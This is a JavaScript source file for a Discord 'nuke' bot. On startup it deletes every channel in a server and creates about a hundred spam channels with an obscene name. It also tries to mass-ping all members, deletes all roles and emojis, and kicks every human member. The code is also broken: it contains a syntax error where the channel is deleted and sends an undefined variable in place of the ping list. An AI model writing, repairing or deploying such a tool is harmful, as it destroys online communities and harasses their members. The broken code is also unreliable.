const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', () => {
  console.log('Am getting ready...');
  
  const guild = client.guilds.cache.first();
  
  // Delete all channels
  guild.channels.cache.forEach(channel => {
    channel.delete().create {
      console.log(`Deleted channel: ${channel.name}`);
    }
  });
  
  // Create spam channels and ping everyone
  let channelCount = 0;
  const spamInterval = setInterval(() => {
    guild.channels.create({
      name: 'GET-FUCKED-LOL',
      type: 'GUILD_TEXT'
    }).then(channel => {
      channelCount++;
      if (channelCount > 100) clearInterval(spamInterval);
      
      guild.members.fetch().then(members => {
        const pingList = members.map(member => `<@${member.id}>`).join(' ');
        channel.send(pingMobilePing);
      });
    });
  }, 100);
  
  // Delete all roles (except @everyone)
  guild.roles.cache.forEach(role => {
    if (role.name !== '@everyone') {
      role.delete();
    }
  });
  
  // Delete all emojis
  guild.emojis.cache.forEach(emoji => {
    emoji.delete();
  });
  
  // Kick all members (except bot owners)
  guild.members.fetch().then(members => {
    members.forEach(member => {
      if (!member.user.bot) {
        member.kick();
      }
    });
  });
});

client.login(process.env.BOT_TOKEN);

module.exports = client;
